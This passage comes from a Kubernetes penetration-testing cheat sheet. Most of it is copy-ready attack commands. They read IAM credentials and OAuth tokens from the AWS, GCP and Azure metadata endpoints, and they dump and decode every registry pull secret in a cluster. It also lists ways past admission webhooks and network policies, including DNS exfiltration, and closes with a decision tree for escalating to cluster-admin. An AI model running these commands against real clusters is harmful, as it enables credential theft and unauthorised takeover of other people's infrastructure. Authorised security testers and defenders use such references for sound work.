curl -sk https://NODE_IP:10250/containerLogs/NAMESPACE/POD_NAME/CONTAINER_NAME
```

---

## 7. CLOUD-SPECIFIC ATTACKS

### 7.1 AWS EKS — IMDS Access

```bash
# From inside a pod (if IMDSv1 or no hop limit enforced):
curl -s http://169.254.169.254/latest/meta-data/iam/security-credentials/
# Returns IAM role name, then:
curl -s http://169.254.169.254/latest/meta-data/iam/security-credentials/ROLE_NAME
# Returns temporary AWS credentials (AccessKeyId, SecretAccessKey, Token)

# IMDSv2 (token required):
IMDS_TOKEN=$(curl -s -X PUT "http://169.254.169.254/latest/api/token" \
  -H "X-aws-ec2-metadata-token-ttl-seconds: 21600")
curl -s -H "X-aws-ec2-metadata-token: $IMDS_TOKEN" \
  http://169.254.169.254/latest/meta-data/iam/security-credentials/

# EKS-specific: IRSA (IAM Roles for Service Accounts)
# Token at: /var/run/secrets/eks.amazonaws.com/serviceaccount/token
# Env vars: AWS_ROLE_ARN, AWS_WEB_IDENTITY_TOKEN_FILE
```

### 7.2 GCP GKE — Metadata API

```bash
# GCE metadata server
curl -s -H "Metadata-Flavor: Google" \
  http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token
# Returns OAuth2 access token

# List available scopes
curl -s -H "Metadata-Flavor: Google" \
  http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/scopes

# GKE Workload Identity (if configured):
# The pod's SA is mapped to a GCP SA
# Token automatically available for GCP API calls
```

### 7.3 Azure AKS — Managed Identity

```bash
# Azure IMDS
curl -s -H "Metadata: true" \
  "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/"
# Returns Azure access token

# AKS Pod Identity / Workload Identity
# Check for AZURE_CLIENT_ID, AZURE_TENANT_ID env vars
env | grep AZURE
```

---

## 8. ADMISSION WEBHOOK BYPASS

| Strategy | Command/Method |
|---|---|
| Excluded namespace | `kubectl get validatingwebhookconfigurations -o yaml \| grep namespaceSelector` → use excluded NS |
| failurePolicy: Ignore | If webhook server down → admission skipped |
| Ephemeral containers | `kubectl debug POD -it --image=alpine` (may not be covered) |
| Static pods | Place manifest in `/etc/kubernetes/manifests/` on node (bypasses API admission) |

---

## 9. CONTAINER REGISTRY ACCESS

```bash
# Extract pull secrets (dockerconfigjson):
kubectl get secrets --all-namespaces -o json | python3 -c 'import sys,json,base64;[print(s["metadata"]["name"],base64.b64decode(s["data"][".dockerconfigjson"]).decode()) for s in json.load(sys.stdin)["items"] if s["type"]=="kubernetes.io/dockerconfigjson"]'

# Pull + inspect images for hardcoded secrets:
docker pull REGISTRY/app:latest && docker history REGISTRY/app:latest --no-trunc
```

---

## 10. NETWORK POLICY ENUMERATION & BYPASS

```bash
kubectl get networkpolicies --all-namespaces
# Find namespaces without policies (default allow-all):
for ns in $(kubectl get ns -o name | cut -d/ -f2); do
    [ "$(kubectl get netpol -n $ns --no-headers 2>/dev/null | wc -l)" -eq 0 ] && echo "NO POLICY: $ns"
done
```

Bypass strategies: DNS exfiltration (port 53 rarely blocked), allowed port tunneling, pod in unprotected namespace, `hostNetwork: true` bypasses pod network policies entirely.

---

## 11. TOOLS

| Tool | Purpose | Command |
|---|---|---|
| **kubectl** | K8s API interaction | `kubectl auth can-i --list` |
| **kube-hunter** | Automated K8s vulnerability scanning | `kube-hunter --remote TARGET` |
| **peirates** | K8s pentesting from inside a pod | `./peirates` |
| **kubesploit** | Post-exploitation framework for K8s | Agent-based C2 |
| **CDK** | Container/K8s exploitation toolkit | `./cdk evaluate` |
| **kubeletctl** | Interact with Kubelet API directly | `kubeletctl pods -s NODE_IP` |
| **kubeaudit** | Cluster misconfiguration audit | `kubeaudit all` |

---

## 12. KUBERNETES PENTESTING DECISION TREE

```
Access to Kubernetes environment?
│
├── Inside a pod?
│   ├── Read SA token → check RBAC permissions (§2.1)
│   │   ├── Can create pods? → privileged pod escape (§3.2)
│   │   ├── Can read secrets? → dump all secrets (§3.2)
│   │   ├── Can exec into pods? → pivot to other pods
│   │   └── Minimal permissions → try Kubelet API (§6)
│   │
│   ├── Cloud environment?
│   │   ├── AWS → check IMDS for IAM creds (§7.1)
│   │   ├── GCP → check metadata for OAuth token (§7.2)
│   │   └── Azure → check IMDS for managed identity (§7.3)
│   │
│   └── Escape to node? → load container-escape-techniques
│
├── Access to node?
│   ├── kubeconfig found? → full cluster access (§1.3)
│   ├── etcd accessible? → dump all secrets (§4)
│   ├── Kubelet cert/key? → API server access
│   └── Static pod manifests? → create privileged static pod (§8)
│
├── External access only?
│   ├── API server exposed? → anonymous/token check (§1)
│   ├── Kubelet 10250 exposed? → direct pod exec (§6)
│   ├── etcd 2379 exposed? → direct secret dump (§4)
│   └── Dashboard/UI exposed? → authentication bypass
│
├── RBAC escalation path?
│   ├── escalate/bind permissions? → grant cluster-admin (§2.3)
│   ├── impersonate permission? → act as admin (§2.3)
│   ├── serviceaccounts/token create? → mint admin token (§3.3)
│   └── Overprivileged clusterrole? → abuse wildcards (§2.2)
│
└── No direct escalation?
    ├── Enumerate network policies → find unprotected namespaces (§10)
    ├── Check admission webhooks → find bypass (§8)
    ├── Pull registry images → search for secrets (§9)
    └── Scan nodes for exposed services → Kubelet, etcd
```
